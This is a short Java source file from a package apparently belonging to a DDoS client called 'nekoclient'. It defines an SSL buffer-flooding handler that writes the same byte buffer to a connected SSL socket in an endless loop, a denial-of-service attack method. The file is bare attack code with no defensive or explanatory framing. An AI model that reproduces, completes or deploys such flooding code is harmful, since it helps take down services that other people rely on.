package dev.neko.nekoclient.api.ddos.impl.handler.ssl;

import java.io.IOException;
import java.io.OutputStream;
import javax.net.ssl.SSLSocket;

public abstract class SSLBufferFloodingMethodHandler extends SSLWriteMethodHandler {
   protected byte[] buffer;

   @Override
   public void handle(SSLSocket socket) throws IOException {
      OutputStream outputStream = socket.getOutputStream();

      while(socket.isConnected()) {
         outputStream.write(this.buffer);
      }
   }
}
